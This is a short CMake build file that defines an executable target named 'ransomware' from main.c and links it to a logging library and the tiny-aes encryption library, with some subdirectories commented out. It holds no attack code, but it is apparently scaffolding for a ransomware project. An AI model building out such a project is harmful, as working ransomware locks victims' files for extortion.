add_executable(ransomware main.c)
  
# add_subdirectory(evolution)
# add_subdirectory(initial)
# add_subdirectory(io)
# add_subdirectory(parser)

target_link_libraries(ransomware
  PRIVATE
    log
    tiny-aes
  )
